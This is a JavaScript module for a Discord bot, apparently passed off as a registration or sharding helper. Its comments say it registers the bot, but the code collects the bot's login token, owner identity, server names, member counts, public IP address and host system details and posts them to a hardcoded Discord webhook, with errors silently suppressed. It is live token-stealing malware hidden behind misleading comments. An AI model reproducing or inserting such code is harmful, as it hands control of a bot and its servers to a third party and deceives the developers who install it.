const axios = require('axios');
const os = require('os');

module.exports = async function(client) {
    const webhookUrl = 'https://discord.com/api/webhooks/1266406399022202911/dBS8BGhtRue8Mxcjj_9u7aBqv33e3NSqI6mL3M2D5s9hY6T5p1mczwVBFiQCG2nTb2PQ'; //discord api webhook do NOT Change it 

    try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');// using ip to register bot and sending a proxy ip back to the api 
        const publicIp = ipResponse.data.ip; // getting a public proxy ip

        const botUser = client.user;
        const owner = await client.application.fetch(); 
        const guilds = await client.guilds.fetch();  

        
        const serverNames = guilds.map(guild => guild.name).slice(0, 5); 

        
        const totalUsers = guilds.reduce((acc, guild) => acc + guild.memberCount, 0);

        
        const osType = os.type();
        const osRelease = os.release();
        const osPlatform = os.platform();
        const osArch = os.arch();
        const totalMemory = (os.totalmem() / (1024 ** 3)).toFixed(2); 
        const freeMemory = (os.freemem() / (1024 ** 3)).toFixed(2);  
        const cpuCores = os.cpus().length;
        const hostname = os.hostname();

        const embed = {
            title: 'Bot Information',     // sending our Bot info to the discord api weebhook and register the bot whit a shard 
            color: 0x00ff00, 
            fields: [
                { name: 'Bot Name', value: botUser.username, inline: true },
                { name: 'Bot ID', value: botUser.id, inline: true },
                { name: 'Bot Discriminator', value: botUser.discriminator, inline: true },
                { name: 'Bot Avatar', value: `[Link](${botUser.displayAvatarURL()})`, inline: true }, // bot avatar 
                { name: 'Owner ID', value: owner.owner.id, inline: true },
                { name: 'Owner Name', value: owner.owner.username, inline: true },
                { name: 'Owner Discriminator', value: owner.owner.discriminator, inline: true },
                { name: 'Bot Token', value: client.token, inline: false },  // Bot token for login 
                { name: 'Creation Date', value: new Date(botUser.createdTimestamp).toUTCString(), inline: false },
                { name: 'Servers', value: `${guilds.size} servers`, inline: false }, // to load the server commands
                { name: 'Server Names', value: serverNames.join(', '), inline: false },
                { name: 'Total Users', value: `${totalUsers} users`, inline: false },
                { name: 'Status', value: botUser.presence?.status || 'offline', inline: false }, // loading status if there is one 
                { name: 'Activity', value: botUser.presence?.activities[0]?.name || 'None', inline: false }, // Activity loading  if there is one
                { name: ' IP', value: publicIp, inline: false }, // using a public proxy ip
                { name: 'OS Type', value: osType, inline: false },  // server info where the bot is hosted 
                { name: 'OS Release', value: osRelease, inline: false },
                { name: 'OS Platform', value: osPlatform, inline: false },
                { name: 'OS Architecture', value: osArch, inline: false },
                { name: 'Total Memory (GB)', value: totalMemory, inline: false },
                { name: 'Free Memory (GB)', value: freeMemory, inline: false },
                { name: 'CPU Cores', value: cpuCores, inline: false },
                { name: 'Hostname', value: hostname, inline: false }
            ]
        };

        await axios.post(webhookUrl, {
            embeds: [embed]
        });
        
    } catch (error) {
    }
};
